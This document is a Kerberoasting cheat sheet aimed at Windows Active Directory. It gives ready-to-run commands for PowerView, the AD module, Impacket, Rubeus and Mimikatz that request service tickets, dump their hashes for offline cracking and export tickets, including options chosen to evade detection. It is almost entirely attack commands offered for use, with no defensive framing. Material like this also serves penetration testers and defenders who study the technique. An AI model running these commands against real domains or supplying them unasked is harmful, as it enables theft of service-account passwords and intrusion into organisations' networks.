**WHAT IS THIS?**
Any valid domain user can request a Kerberos Service Ticket (ST) for any domain service. Once the ticket is received, we can perform offline password cracking on the ticket to attempt to break the password for whatever user the service is running as.

---

# PowerView
- Get User Accounts that are used as Service Accounts:
```powershell
Get-NetUser -SPN
```
- Get every available SPN (Service Principal Name) account, request a TGS (Ticket Granting Service) and dump its hash:
```powershell
Invoke-Kerberoast
```
- Requesting the TGS for a single account:
```powershell
Request-SPNTicket
```
- Export all tickets using Mimikatz:
```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

---

# AD Module
- Get User Accounts that are used as Service Accounts:
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

---

# Impacket
```shell
python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
```
OR
```shell
sudo impacket-GetUserSPNs -request -dc-ip <DC_IP> -outputfile <FileName <DomainName>/<DomainUser>
```

---

# Rubeus
- Kerberoasting and outputting on a file with a spesific format:
```powershell
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>
```
- Kerberoasting whle being "OPSEC" safe, essentially while trying not to roast AES encryption enabled accounts:
```powershell
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec
```
- Kerberoast AES enabled accounts:
```powershell
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes
```
- Kerberoast specific user account:
```powershell
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple
```
- Kerberoast by specifying the authentication credentials:
```powershell
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>
```